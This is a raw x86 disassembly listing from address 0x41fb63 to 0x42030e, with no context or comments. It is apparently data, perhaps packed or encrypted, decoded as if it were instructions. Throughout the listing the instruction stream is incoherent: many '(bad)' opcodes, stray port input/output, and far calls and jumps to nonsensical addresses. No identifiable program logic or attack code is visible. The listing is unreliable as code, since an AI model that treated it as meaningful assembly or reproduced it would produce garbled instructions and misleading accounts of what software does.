  41fb63:	in     eax,0x9b
  41fb65:	or     ah,0xec
  41fb68:	lahf   
  41fb69:	cld    
  41fb6a:	push   ss
  41fb6b:	xchg   ebp,eax
  41fb6c:	sub    eax,DWORD PTR [edi]
  41fb6e:	bound  esi,QWORD PTR [eax+0x78]
  41fb71:	inc    ebx
  41fb72:	xchg   al,bl
  41fb74:	scas   eax,DWORD PTR es:[edi]
  41fb75:	dec    edi
  41fb76:	dec    eax
  41fb77:	shl    DWORD PTR [edi-0x34],1
  41fb7a:	mov    edx,0xa5ff116b
  41fb7f:	std    
  41fb80:	aas    
  41fb81:	or     al,0xe6
  41fb83:	or     eax,0x8b95fc44
  41fb88:	jg     0x41fb41
  41fb8a:	call   0xbb68:0xfcffff70
  41fb91:	and    eax,DWORD PTR [esi]
  41fb93:	fiadd  DWORD PTR [ebp+edi*8+0x0]
  41fb97:	mov    ds:0x6dfcd249,al
  41fb9c:	dec    edi
  41fb9d:	mov    al,0x88
  41fb9f:	jbe    0x41fb94
  41fba1:	pop    ebx
  41fba2:	imul   ecx
  41fba4:	(bad)  
  41fba5:	clc    
  41fba6:	jle    0x41fbee
  41fba8:	push   0xc6620004
  41fbad:	stos   DWORD PTR es:[edi],eax
  41fbae:	cld    
  41fbaf:	iret   
  41fbb0:	xor    BYTE PTR [esi-0x12],0xe9
  41fbb4:	fdiv   DWORD PTR [ebx+edi*8+0x465b903d]
  41fbbb:	cs pop ebp
  41fbbd:	sub    eax,edx
  41fbbf:	pop    esi
  41fbc0:	stos   DWORD PTR es:[edi],eax
  41fbc1:	sub    DWORD PTR [edx+esi*8-0x28],ebx
  41fbc5:	jmp    0xe628decd
  41fbca:	add    edx,DWORD PTR [esi+0x55d032ce]
  41fbd0:	push   edx
  41fbd1:	pushf  
  41fbd2:	sti    
  41fbd3:	(bad)  
  41fbd4:	jmp    0x41fbcb
  41fbd6:	fldenv [eax+0x66]
  41fbd9:	xchg   ebx,eax
  41fbda:	inc    DWORD PTR ds:0x6204d931
  41fbe0:	pop    ebp
  41fbe1:	sub    edi,ecx
  41fbe3:	mov    ecx,0x3178a3f2
  41fbe8:	mov    ebp,0x68c5aced
  41fbed:	es inc ebp
  41fbef:	(bad)  
  41fbf0:	repnz out 0xb4,al
  41fbf3:	sub    al,0x66
  41fbf5:	pop    ebx
  41fbf6:	cld    
  41fbf7:	call   0x660210
  41fbfc:	scas   eax,DWORD PTR es:[edi]
  41fbfd:	out    dx,al
  41fbfe:	in     eax,dx
  41fbff:	pop    ebx
  41fc00:	push   edx
  41fc01:	hlt    
  41fc02:	retf   0xe845
  41fc05:	sbb    al,0xe
  41fc07:	cld    
  41fc08:	fcomp  QWORD PTR [esi+eax*1]
  41fc0b:	and    al,0x7a
  41fc0d:	or     ch,dl
  41fc0f:	add    esp,DWORD PTR [edx+0x52]
  41fc12:	mov    cl,0x7f
  41fc14:	jle    0x41fc02
  41fc16:	sti    
  41fc17:	lods   al,BYTE PTR ds:[esi]
  41fc18:	call   0x1e39c239
  41fc1d:	push   esp
  41fc1e:	and    eax,0x43714a20
  41fc23:	xlat   BYTE PTR ds:[ebx]
  41fc24:	pop    esi
  41fc25:	outs   dx,BYTE PTR gs:[esi]
  41fc27:	xor    eax,0x2c84e3d
  41fc2c:	bound  edx,QWORD PTR [eax+0x0]
  41fc2f:	sbb    al,0x46
  41fc31:	push   edx
  41fc32:	dec    edx
  41fc33:	loope  0x41fbe9
  41fc35:	sbb    BYTE PTR ds:0x7565f1f9,ah
  41fc3b:	stc    
  41fc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc3d:	out    0xc,eax
  41fc3f:	inc    ecx
  41fc40:	mov    dh,0xae
  41fc42:	add    ecx,ebp
  41fc44:	call   0xd9:0x60f12428
  41fc4b:	ins    BYTE PTR es:[edi],dx
  41fc4c:	retf   0x10b8
  41fc4f:	inc    ecx
  41fc50:	int    0xef
  41fc52:	sti    
  41fc53:	cs push ebx
  41fc55:	cdq    
  41fc56:	aaa    
  41fc57:	das    
  41fc58:	or     esp,DWORD PTR ds:0x6c741f3
  41fc5e:	mov    BYTE PTR [eax+eax*1],cl
  41fc61:	mov    ebp,0xce90c9a
  41fc66:	push   edx
  41fc67:	in     al,dx
  41fc68:	push   0xe8fea03a
  41fc6d:	popa   
  41fc6e:	or     dl,BYTE PTR [ebx-0x62]
  41fc71:	dec    esp
  41fc72:	dec    edi
  41fc73:	enter  0x26ec,0x65
  41fc77:	call   0xfba67ee6
  41fc7c:	sbb    ah,BYTE PTR [esi]
  41fc7e:	dec    edi
  41fc7f:	dec    ebp
  41fc80:	xchg   ecx,eax
  41fc81:	sub    ch,BYTE PTR [edi+eax*4-0x4f]
  41fc85:	sbb    BYTE PTR [edi],dl
  41fc87:	cmc    
  41fc88:	jo     0x41fc5e
  41fc8a:	ins    BYTE PTR es:[edi],dx
  41fc8b:	mov    DWORD PTR [edx+ebx*1],esp
  41fc8e:	jl     0x41fcdb
  41fc90:	push   ebp
  41fc91:	pusha  
  41fc92:	fldenv [edx-0x10]
  41fc95:	les    ebp,FWORD PTR [esp+esi*2]
  41fc98:	fldlg2 
  41fc9a:	push   ss
  41fc9b:	mov    ecx,0xf50ef539
  41fca0:	or     DWORD PTR [edi],0xdd8efa80
  41fca6:	and    al,0x74
  41fca8:	add    BYTE PTR [ebx],ch
  41fcaa:	loope  0x41fcfa
  41fcac:	cld    
  41fcad:	shr    BYTE PTR [ebx],1
  41fcaf:	out    dx,eax
  41fcb0:	call   0x3f1288
  41fcb5:	shr    BYTE PTR [ebx],0xef
  41fcb8:	mov    eax,ebx
  41fcba:	add    bh,bh
  41fcbc:	and    BYTE PTR [edx],bh
  41fcbe:	fdiv   DWORD PTR [ecx]
  41fcc0:	rol    dl,0x23
  41fcc3:	out    dx,eax
  41fcc4:	mov    DWORD PTR [eax],eax
  41fcc6:	(bad)  
  41fcc7:	jae    0x7f2d9c12
  41fccd:	int3   
  41fcce:	dec    esi
  41fccf:	sbb    eax,0x2b7e50fd
  41fcd4:	out    dx,eax
  41fcd5:	call   0x3fb94a
  41fcda:	jo     0x41fd07
  41fcdc:	out    dx,eax
  41fcdd:	test   BYTE PTR [ebx],bh
  41fcdf:	xchg   esp,eax
  41fce0:	push   ss
  41fce1:	mov    esp,DWORD PTR [esi+0x74c5e41b]
  41fce7:	sbb    eax,0x140e8bfd
  41fcec:	mov    eax,ebx
  41fcee:	jae    0x41fc9a
  41fcf0:	sbb    eax,DWORD PTR [ecx]
  41fcf2:	mov    ebx,0xde21c3c8
  41fcf7:	bndstx [ebp-0x41],bnd1
  41fcfb:	push   ebp
  41fcfc:	inc    esi
  41fcfd:	hlt    
  41fcfe:	xchg   ebx,eax
  41fcff:	sbb    bl,BYTE PTR [ecx+eax*1]
  41fd02:	mov    ebx,0x21e44e48
  41fd07:	js     0x41fd5b
  41fd09:	call   0x401802
  41fd0e:	loop   0x41fcea
  41fd10:	mov    al,ds:0xba527b40
  41fd15:	test   eax,edx
  41fd17:	(bad)  
  41fd18:	aas    
  41fd19:	ret    
  41fd1a:	cmp    edx,DWORD PTR [edx-0x4]
  41fd1d:	cmovbe ecx,DWORD PTR [eax]
  41fd20:	dec    ebx
  41fd21:	jmp    DWORD PTR [edx+0x5]
  41fd24:	leave  
  41fd25:	std    
  41fd26:	pop    ebp
  41fd27:	push   esp
  41fd28:	xchg   ecx,eax
  41fd29:	inc    edx
  41fd2a:	add    BYTE PTR [esi],bh
  41fd2c:	rcl    DWORD PTR [ecx+0x4c75242],0x50
  41fd33:	cmp    dh,BYTE PTR [ebx]
  41fd35:	sbb    DWORD PTR [eax],eax
  41fd37:	(bad)  
  41fd38:	out    dx,eax
  41fd39:	dec    eax
  41fd3a:	pop    ss
  41fd3b:	jmp    0x3b3188eb
  41fd40:	lock in al,0xfe
  41fd43:	and    eax,0x9ee74bf8
  41fd48:	rol    BYTE PTR ds:0x89b05100,1
  41fd4e:	cmc    
  41fd4f:	pop    ebp
  41fd50:	cmp    al,0xc8
  41fd52:	out    dx,eax
  41fd53:	enter  0x61a,0x0
  41fd57:	bound  eax,QWORD PTR ds:0xbbf7c792
  41fd5d:	aas    
  41fd5e:	lds    esp,FWORD PTR [ebx+0x70]
  41fd61:	les    ecx,FWORD PTR [ecx+0x6f]
  41fd64:	leave  
  41fd65:	fistp  WORD PTR [ebp+0x39]
  41fd68:	mov    ecx,0xcce95243
  41fd6d:	test   ebx,ebp
  41fd6f:	pop    esi
  41fd70:	jno    0x41fd71
  41fd72:	push   DWORD PTR [ecx]
  41fd74:	mul    ecx
  41fd76:	pop    es
  41fd77:	adc    al,0x4b
  41fd79:	jle    0x41fd7a
  41fd7b:	arpl   WORD PTR [eax-0x1],si
  41fd7e:	mov    BYTE PTR [ebx+0x3071fbb9],dh
  41fd84:	mov    ds:0xa8a55d2,eax
  41fd89:	in     eax,0xfe
  41fd8b:	xchg   ebp,eax
  41fd8c:	out    dx,eax
  41fd8d:	ror    BYTE PTR [ebx],0x0
  41fd90:	bound  ebp,QWORD PTR [edx+eiz*8-0x7d83f004]
  41fd97:	mov    ds:0xfc3e327a,al
  41fd9c:	(bad)  
  41fd9d:	fnstenv [eax+edx*4+0x75]
  41fda1:	arpl   WORD PTR [edx-0x403b82be],bx
  41fda7:	inc    edx
  41fda8:	pop    esi
  41fda9:	push   esp
  41fdaa:	pop    esp
  41fdab:	cmp    edx,DWORD PTR [edi+0x62]
  41fdae:	sbb    dl,0xb7
  41fdb1:	jno    0x41fdf9
  41fdb3:	out    dx,al
  41fdb4:	inc    esi
  41fdb5:	bound  ebp,QWORD PTR [eax+0x1]
  41fdb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb9:	sbb    BYTE PTR [ecx+ecx*8],dl
  41fdbc:	mov    al,0x9f
  41fdbe:	sar    DWORD PTR [ebx],1
  41fdc0:	sub    al,0x62
  41fdc2:	jmp    0xbb13a557
  41fdc7:	lods   eax,DWORD PTR ds:[esi]
  41fdc8:	arpl   WORD PTR [esp+esi*4+0xb],dx
  41fdcc:	lods   eax,DWORD PTR ds:[esi]
  41fdcd:	jno    0x41fdcd
  41fdcf:	cdq    
  41fdd0:	or     al,0x62
  41fdd2:	outs   dx,BYTE PTR ds:[esi]
  41fdd3:	enter  0x9e5d,0xab
  41fdd7:	pop    es
  41fdd8:	jno    0x41fd9d
  41fdda:	fidivr DWORD PTR [edx+0x5e]
  41fddd:	and    BYTE PTR [ebx],bl
  41fddf:	add    al,0x62
  41fde1:	fld    DWORD PTR [ebx-0x7165b02]
  41fde7:	shl    esp,cl
  41fde9:	aad    0x5c
  41fdeb:	leave  
  41fdec:	imul   ecx,DWORD PTR [ecx],0xffffff9c
  41fdef:	sub    ebx,DWORD PTR [ebp-0x47]
  41fdf2:	call   0xd853fdfa
  41fdf7:	inc    BYTE PTR [eax+esi*2]
  41fdfa:	cdq    
  41fdfb:	mov    ah,cl
  41fdfd:	sbb    dl,BYTE PTR [eax+0x58620ca7]
  41fe03:	int    0x10
  41fe05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe06:	popa   
  41fe07:	jmp    0x6d9005e0
  41fe0c:	call   0x42bd682
  41fe11:	xor    DWORD PTR [esi-0x31],ecx
  41fe14:	fcmove st,st(3)
  41fe16:	push   0x0
  41fe18:	call   0x6295d77e
  41fe1d:	cmp    esp,edi
  41fe1f:	aaa    
  41fe20:	ret    
  41fe21:	test   al,0xd5
  41fe23:	cs test eax,0x5e0bfa37
  41fe29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe2a:	adc    BYTE PTR [esi+0x5c],dl
  41fe2d:	sbb    edx,ebx
  41fe2f:	push   edx
  41fe30:	xchg   ecx,eax
  41fe31:	mov    cl,0xbd
  41fe33:	add    ecx,ebp
  41fe35:	ss xchg ecx,eax
  41fe37:	push   ecx
  41fe38:	add    esp,DWORD PTR [esi+0x54]
  41fe3b:	or     al,0xb9
  41fe3d:	mov    DWORD PTR [esp+ebp*8],esp
  41fe40:	mov    ds:0xf9f14353,ax
  41fe46:	push   0x961e901
  41fe4b:	addr16 jmp 0x41fe32
  41fe4e:	add    eax,0xd59aa005
  41fe53:	inc    esp
  41fe54:	test   al,0x2b
  41fe56:	sbb    al,0x63
  41fe58:	pusha  
  41fe59:	add    BYTE PTR [esi+0x71],bl
  41fe5c:	mov    al,0x54
  41fe5e:	popa   
  41fe5f:	fnstcw WORD PTR [edi+0x65]
  41fe62:	cli    
  41fe63:	mov    esp,0xd961e901
  41fe68:	je     0x41fe37
  41fe6a:	and    ch,BYTE PTR [esp]
  41fe6d:	lds    esp,FWORD PTR [eax-0x27]
  41fe70:	add    BYTE PTR [edx-0x6],ch
  41fe73:	mov    esp,0x14d4e914
  41fe78:	and    eax,0x2a1289dd
  41fe7d:	out    dx,al
  41fe7e:	and    dl,BYTE PTR [ebx+0x4c]
  41fe81:	or     eax,0xeb00f156
  41fe86:	popa   
  41fe87:	fst    DWORD PTR [ebx-0x3f]
  41fe8a:	(bad)  
  41fe8b:	mov    bh,0xfb
  41fe8d:	into   
  41fe8e:	adc    DWORD PTR [edi+0x5a],ebx
  41fe91:	add    BYTE PTR [ebp-0x80],al
  41fe94:	pop    eax
  41fe95:	cmp    DWORD PTR [edi-0x74000430],0xa000416
  41fe9f:	mov    al,0xf
  41fea1:	add    edi,DWORD PTR [ebx-0x24]
  41fea4:	push   ecx
  41fea5:	push   ebp
  41fea6:	push   es
  41fea7:	fdiv   st(6),st
  41fea9:	dec    DWORD PTR [ebx-0x7e]
  41feac:	mov    cl,dh
  41feae:	xor    BYTE PTR [edi],al
  41feb0:	jb     0x41ff23
  41feb2:	(bad)  
  41feb3:	ds sti 
  41feb5:	std    
  41feb6:	les    ebx,FWORD PTR [ecx]
  41feb8:	add    esi,ebx
  41feba:	loopne 0x41fef0
  41febc:	cmp    BYTE PTR [eax+eax*1+0x781f],0x3b
  41fec4:	fmul   QWORD PTR [ecx+0x1f98b206]
  41feca:	adc    BYTE PTR [edi],bh
  41fecc:	jae    0x41feca
  41fece:	mov    ah,0x5f
  41fed0:	jno    0x41fed2
  41fed2:	add    bl,bh
  41fed4:	push   esp
  41fed5:	pop    edi
  41fed6:	and    al,0x27
  41fed8:	fadd   QWORD PTR [edi-0x174690b4]
  41fede:	jmp    0x8e3f1946
  41fee3:	mov    edi,0xff6a0b77
  41fee8:	mov    eax,DWORD PTR [esi-0x1c8450b4]
  41feee:	ins    BYTE PTR es:[edi],dx
  41feef:	mov    eax,ds:0xff8bfd18
  41fef4:	ja     0x41ff01
  41fef6:	cmp    eax,0x45559aff
  41fefb:	ds jbe 0x41fefa
  41fefe:	mov    ah,0x9f
  41ff00:	ja     0x41ff02
  41ff02:	add    BYTE PTR [ebx+0x63243f48],bh
  41ff08:	test   DWORD PTR [eax-0x6f0a9d2a],ecx
  41ff0e:	and    ecx,DWORD PTR [edx+0x71]
  41ff11:	(bad)  
  41ff12:	(bad)  
  41ff13:	fild   DWORD PTR ds:0xc77a1be9
  41ff19:	cmp    bh,ah
  41ff1b:	jge    0x41ff0a
  41ff1d:	inc    esp
  41ff1e:	jb     0x41ff71
  41ff20:	mov    eax,0xf400f0f7
  41ff25:	pop    eax
  41ff26:	out    dx,eax
  41ff27:	mov    edi,0x7ed79d04
  41ff2c:	es pop ebp
  41ff2e:	(bad)  
  41ff2f:	jmp    DWORD PTR [edx+0x32]
  41ff32:	or     BYTE PTR [eax],al
  41ff34:	fldcw  WORD PTR [esi]
  41ff36:	daa    
  41ff37:	out    dx,eax
  41ff38:	mov    bl,0xc1
  41ff3a:	iret   
  41ff3b:	push   edx
  41ff3c:	xchg   esp,eax
  41ff3d:	sti    
  41ff3e:	xor    eax,0xc2fc1888
  41ff43:	cmp    edx,DWORD PTR [ebp+0x4623c0eb]
  41ff49:	jmp    0x41ff72
  41ff4b:	sub    BYTE PTR [esp+esi*2],cl
  41ff4e:	inc    ebp
  41ff4f:	mov    ah,BYTE PTR [esi+0x5f]
  41ff52:	aam    0x52
  41ff54:	or     eax,0x2c88f321
  41ff59:	in     al,dx
  41ff5a:	dec    edx
  41ff5b:	xchg   BYTE PTR [esi-0x6a181b34],ah
  41ff61:	cs add al,0x0
  41ff64:	fild   QWORD PTR [ebx+eiz*8]
  41ff67:	sbb    edx,DWORD PTR [edx+0x3154bf4a]
  41ff6d:	(bad)  
  41ff6e:	sbb    DWORD PTR [ebx+esi*2+0x30],eax
  41ff72:	inc    DWORD PTR [edx+0x30fbdca2]
  41ff78:	fwait
  41ff79:	jmp    0x41ffd0
  41ff7b:	cmp    BYTE PTR [ebp+0x3e80dedc],0x94
  41ff82:	ltr    WORD PTR [ebp-0x27]
  41ff86:	fwait
  41ff87:	inc    esp
  41ff88:	add    bl,bl
  41ff8a:	adc    eax,0xd54de3e6
  41ff8f:	out    dx,eax
  41ff90:	cmp    eax,0x4493ced4
  41ff95:	or     eax,0x1e0eed60
  41ff9a:	adc    eax,0x53201406
  41ff9f:	mov    eax,ds:0x8ceb8efa
  41ffa4:	nop
  41ffa5:	and    DWORD PTR [ebp-0x1a992bfb],esi
  41ffab:	(bad)
  41ffae:	or     dl,BYTE PTR [ebx+0x29c89e18]
  41ffb4:	add    al,0xdb
  41ffb6:	add    al,0xce
  41ffb8:	pop    ss
  41ffb9:	(bad)  
  41ffbb:	retf   0x938a
  41ffbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffbf:	sbb    ecx,ebx
  41ffc1:	(bad)  
  41ffc2:	push   edx
  41ffc3:	fwait
  41ffc4:	sub    ebp,DWORD PTR [ecx]
  41ffc6:	fsub   st(0),st
  41ffc8:	add    eax,DWORD PTR [edi-0x4b254301]
  41ffce:	add    BYTE PTR [eax],ch
  41ffd0:	or     esp,DWORD PTR [edx+0x7]
  41ffd3:	pop    edi
  41ffd4:	xor    al,0xda
  41ffd6:	push   cs
  41ffd7:	push   ss
  41ffd8:	sub    al,0x10
  41ffda:	mov    esp,0xdee303e8
  41ffdf:	stc    
  41ffe0:	add    ebp,DWORD PTR [esi-0x30]
  41ffe3:	sub    dh,BYTE PTR [ebp-0x6403a1c3]
  41ffe9:	push   ebx
  41ffea:	sbb    edx,ebp
  41ffec:	fld    QWORD PTR [eax]
  41ffee:	mov    ds:0x55345f06,al
  41fff3:	mov    bh,0xb
  41fff5:	or     BYTE PTR [edi-0x53],0xe9
  41fff9:	mov    eax,0xe3e9f167
  41fffe:	mov    ebp,0x6183005d
  420003:	pop    esp
  420004:	xor    eax,0x119eca1
  420009:	out    0x4d,al
  42000b:	pop    ebp
  42000c:	adc    BYTE PTR [ecx],ch
  42000e:	push   si
  420010:	inc    edx
  420011:	add    eax,0xe5751ddd
  420016:	xchg   ebx,eax
  420017:	sbb    eax,0xc9bbe5e7
  42001c:	sti    
  42001d:	xor    eax,0x2f8dd18a
  420022:	jp     0x420031
  420024:	cld    
  420025:	aam    0x8d
  420027:	ret    
  420028:	inc    eax
  420029:	jmp    0x724e9a10
  42002e:	lods   al,BYTE PTR ds:[esi]
  42002f:	je     0x420033
  420031:	jmp    0xe8f2d997
  420036:	das    
  420037:	fwait
  420038:	add    al,0xe9
  42003a:	das    
  42003b:	push   es
  42003c:	mov    BYTE PTR [eax-0x1724af8],al
  420042:	pop    ebp
  420043:	out    dx,eax
  420044:	add    BYTE PTR [edi],dl
  420046:	outs   dx,DWORD PTR ds:[esi]
  420047:	(bad)  
  420048:	jmp    DWORD PTR fs:[ecx]
  42004b:	pop    ebp
  42004c:	xchg   BYTE PTR [esi-0x1a3ba5f3],ah
  420052:	add    al,ch
  420054:	adc    eax,0xc1272619
  420059:	add    BYTE PTR [ecx],cl
  42005b:	pop    esi
  42005c:	fstp   DWORD PTR [ebx+0x26]
  42005f:	fs mov cl,0x0
  420062:	jmp    0x9801fbc8
  420067:	fisubr DWORD PTR [ebx-0xe]
  42006a:	out    dx,eax
  42006b:	pusha  
  42006c:	in     eax,0x6
  42006e:	push   0x1c
  420070:	adc    DWORD PTR [ecx],eax
  420072:	pushf  
  420073:	pop    ebp
  420074:	stos   BYTE PTR es:[edi],al
  420075:	rol    BYTE PTR [edx],0x73
  420078:	pop    ecx
  420079:	jl     0x42007b
  42007b:	xchg   edi,eax
  42007c:	rol    BYTE PTR [eax],1
  42007e:	je     0x420032
  420080:	popf   
  420081:	jne    0x4200b3
  420083:	lods   al,BYTE PTR ds:[esi]
  420084:	ret    
  420085:	dec    eax
  420086:	adc    ebx,edi
  420088:	fadd   DWORD PTR [edi-0x3e84b8ba]
  42008e:	add    al,0x8b
  420090:	test   DWORD PTR [eax+0x478d00f9],ecx
  420096:	test   edx,eax
  420098:	and    al,0x21
  42009a:	push   esi
  42009b:	adc    BYTE PTR [edi],ah
  42009d:	or     ebp,DWORD PTR [edx-0x69]
  4200a0:	dec    ebx
  4200a1:	inc    esp
  4200a2:	xor    al,0x5b
  4200a4:	mov    ah,bh
  4200a6:	adc    eax,0x40c35f
  4200ab:	lock xchg esp,eax
  4200ad:	inc    edi
  4200ae:	add    DWORD PTR [edi],0xffffffcc
  4200b1:	xor    DWORD PTR [eax+0x5b],0xffffff86
  4200b5:	cld    
  4200b6:	adc    eax,0x40caab00
  4200bb:	add    BYTE PTR [ebp+0x7e],bh
  4200be:	rcl    BYTE PTR [esi-0x50],0xa7
  4200c2:	push   esp
  4200c3:	mov    DWORD PTR [ebp+0x3bfffbd1],0xc306c5d8
  4200cd:	clc    
  4200ce:	cmp    eax,DWORD PTR [eax]
  4200d0:	mov    esi,DWORD PTR [esi]
  4200d2:	paddd  mm7,QWORD PTR [eax-0x62]
  4200d6:	cmp    BYTE PTR [esi-0x45],0x4e
  4200da:	jge    0x420120
  4200dc:	jnp    0x420114
  4200de:	imul   edi,esi,0xffffffd5
  4200e1:	test   BYTE PTR [esi+0xd85b8e],al
  4200e7:	add    BYTE PTR [edx-0x4ff6822],al
  4200ed:	xlat   BYTE PTR ds:[ebx]
  4200ee:	cmp    DWORD PTR [esi+0xd82b],0x62
  4200f5:	fisub  DWORD PTR [edi+0x7b]
  4200f8:	bound  esi,QWORD PTR [edx-0x2b]
  4200fb:	imul   esp,DWORD PTR [ebx-0x1b],0x72637f8d
  420102:	jmp    edi
  420104:	fsub   st,st(5)
  420106:	(bad)  
  420107:	(bad)  
  420108:	fdiv   DWORD PTR ds:0x33db0be3
  42010e:	lock add DWORD PTR [edx+0x72],esp
  420112:	mov    WORD PTR [ebp-0x8fa6],?
  420118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420119:	repz clc 
  42011b:	add    DWORD PTR [eax],eax
  42011d:	bound  esi,QWORD PTR [edx+0x4]
  420120:	(bad)
  420123:	add    eax,0x648e6200
  420128:	aas    
  420129:	(bad)  
  42012a:	cli    
  42012b:	mov    esi,0xe0add907
  420130:	por    mm6,QWORD PTR [edx-0x736176f8]
  420137:	or     eax,DWORD PTR [edi-0x77299f5c]
  42013d:	sbb    al,0xb3
  42013f:	inc    edx
  420140:	or     esp,DWORD PTR [edx-0x3e]
  420143:	mov    ebp,esi
  420145:	out    0xf2,eax
  420147:	hlt    
  420148:	add    DWORD PTR [edx+0x70],esp
  42014b:	ds add eax,0xffc4512a
  420151:	add    eax,0x62000506
  420156:	cmc    
  420157:	xchg   BYTE PTR [edi+0x63],bh
  42015a:	jo     0x42015b
  42015c:	out    0xf7,eax
  42015e:	xchg   esp,eax
  42015f:	(bad)  
  420160:	(bad)  
  420161:	out    dx,eax
  420162:	jmp    0xe127:0x70f5ff54
  420169:	outs   dx,BYTE PTR ds:[esi]
  42016a:	jo     0x42016b
  42016c:	mov    dl,BYTE PTR [ecx+ebx*8+0x5b402b99]
  420173:	sbb    bh,BYTE PTR [ebx]
  420175:	call   0x286dff85
  42017a:	pop    ebx
  42017b:	or     bh,BYTE PTR [ebx]
  42017d:	iret   
  42017e:	adc    eax,0xbd000bce
  420183:	xchg   ebx,eax
  420184:	jecxz  0x4201d5
  420186:	ficomp WORD PTR [ecx]
  420188:	jmp    0x1c2c:0x1b4e66af
  42018f:	mov    ebp,0x93eb03e8
  420194:	cmp    eax,DWORD PTR [esi+0x61]
  420197:	fnstenv [esi]
  420199:	(bad)
  42019d:	rcr    dl,1
  42019f:	scas   al,BYTE PTR es:[edi]
  4201a0:	sbb    edx,ebx
  4201a2:	jmp    0xf6d9:0x62060120
  4201a9:	xor    eax,esp
  4201ab:	pop    edx
  4201ac:	xor    eax,0xdd48db10
  4201b1:	add    eax,0x56ed962
  4201b6:	fwait
  4201b7:	mov    cl,0x1d
  4201b9:	out    0xa7,eax
  4201bb:	push   esi
  4201bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201bd:	dec    DWORD PTR [edx-0x43ca089e]
  4201c3:	cwde   
  4201c4:	mov    ecx,0x16d96205
  4201c9:	(bad)  
  4201ca:	sub    al,0x5b
  4201cc:	sbb    DWORD PTR [ebx+esi*2],edx
  4201cf:	nop
  4201d0:	cmp    bx,WORD PTR [esi]
  4201d3:	retf   0x4374
  4201d6:	mov    dh,0xfb
  4201d8:	mov    ah,0xde
  4201da:	and    edx,ebp
  4201dc:	jmp    0x3cafc7d6
  4201e1:	shr    edx,1
  4201e3:	daa    
  4201e4:	add    DWORD PTR [esi],eax
  4201e6:	add    BYTE PTR [edx-0x27],ah
  4201e9:	add    dl,bh
  4201eb:	mov    eax,ds:0xb5378605
  4201f0:	rol    DWORD PTR [edi+0xd7cd70],0xe9
  4201f7:	in     al,0xdd
  4201f9:	and    al,0xe5
  4201fb:	fmul   st(2),st
  4201fd:	aaa    
  4201fe:	shl    ebp,cl
  420200:	int3   
  420201:	inc    eax
  420202:	push   0x26
  420204:	(bad)  
  420205:	aaa    
  420206:	daa    
  420207:	out    dx,eax
  420208:	addr16 das 
  42020a:	sub    DWORD PTR [eax+0x61e5befb],ecx
  420210:	push   eax
  420211:	mov    esi,0x880553d2
  420216:	mov    al,ds:0xe900d796
  42021b:	xchg   esi,eax
  42021c:	xchg   DWORD PTR [ebp+0x4fafd2ce],eax
  420222:	jb     0x4201be
  420224:	mov    ch,0xc
  420226:	pop    ss
  420227:	out    0x2a,eax
  420229:	xor    al,0xeb
  42022b:	popa   
  42022c:	fld    DWORD PTR [edi+0x74c166e7]
  420232:	repz daa 
  420234:	pop    edx
  420235:	ret    0x56e5
  420238:	outs   dx,BYTE PTR cs:[esi]
  42023a:	fwait
  42023b:	jg     0x420221
  42023d:	sub    DWORD PTR [eax-0x16ff24b2],0x7e016217
  420247:	push   cs
  420248:	fstp   QWORD PTR [edx+0x12]
  42024b:	add    BYTE PTR [ebx],cl
  42024d:	sbb    eax,DWORD PTR [ecx+ebp*8]
  420250:	adc    esp,DWORD PTR [edx-0xf]
  420253:	cs pusha 
  420255:	cmp    eax,0x4161a9a0
  42025a:	stos   DWORD PTR es:[edi],eax
  42025b:	jno    0x4202a8
  42025d:	push   ebp
  42025e:	xchg   DWORD PTR [edi],ebx
  420260:	mov    ds:0x840088de,eax
  420265:	sbb    eax,0x75e9e7fb
  42026a:	cld    
  42026b:	inc    DWORD PTR [eax-0x23900dd]
  420271:	call   0x330d4316
  420276:	loop   0x4202dc
  420278:	pusha  
  420279:	fadd   QWORD PTR [eax]
  42027b:	xor    edi,0x38
  42027e:	(bad)  
  42027f:	(bad)  
  420280:	out    dx,eax
  420281:	out    dx,al
  420282:	mov    DWORD PTR [edi+ebp*4+0x58],ecx
  420286:	jecxz  0x420288
  420288:	adc    DWORD PTR [edx],0x39078bfd
  42028e:	jmp    edi
  420290:	add    dh,dh
  420292:	sti    
  420293:	dec    ecx
  420295:	pop    eax
  420296:	sti    
  420297:	xor    BYTE PTR [edi],0x39
  42029a:	(bad)  
  42029b:	jmp    FWORD PTR [esi]
  42029d:	fild   DWORD PTR [ecx-0x616b38]
  4202a3:	call   DWORD PTR [edx-0x4b0094c2]
  4202a9:	daa    
  4202aa:	mov    ah,ch
  4202ac:	dec    edx
  4202ad:	sub    al,0x50
  4202af:	xor    eax,DWORD PTR [eax]
  4202b1:	shr    BYTE PTR ds:0x2c074586,1
  4202b7:	push   eax
  4202b8:	push   0x3f
  4202ba:	sub    eax,0x86f45350
  4202bf:	add    ebp,DWORD PTR [eax+0x3a]
  4202c2:	fadd   QWORD PTR [eax]
  4202c4:	and    ah,0xe6
  4202c7:	je     0x4202d9
  4202c9:	mov    ebx,ebp
  4202cb:	jg     0x42028d
  4202cd:	cs daa 
  4202cf:	push   ebp
  4202d0:	mov    ebp,DWORD PTR [eax-0x25f3b19b]
  4202d6:	sub    ch,BYTE PTR [ecx+0x6]
  4202d9:	xor    DWORD PTR [eax+0x69],ebx
  4202dc:	add    al,0x62
  4202de:	mov    DWORD PTR [edi],esp
  4202e0:	pop    ebp
  4202e1:	cli    
  4202e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e3:	cmp    BYTE PTR [edx-0x75306559],cl
  4202e9:	lahf   
  4202ea:	dec    edx
  4202eb:	iret   
  4202ec:	push   eax
  4202ed:	js     0x420332
  4202ef:	aam    0x50
  4202f1:	xchg   ecx,eax
  4202f2:	pop    es
  4202f3:	stos   DWORD PTR es:[edi],eax
  4202f4:	or     ebx,ebp
  4202f6:	je     0x42032b
  4202f8:	cld    
  4202f9:	outs   dx,DWORD PTR ds:[esi]
  4202fa:	outs   dx,BYTE PTR ds:[esi]
  4202fb:	cmovo  esp,DWORD PTR [edx-0x3b]
  4202ff:	aas    
  420300:	jb     0x420357
  420302:	out    0xaa,eax
  420304:	pop    es
  420305:	mov    ebp,0x22100334
  42030a:	inc    edx
  42030b:	test   BYTE PTR [edx-0x56],bh
  42030e:	inc    eax
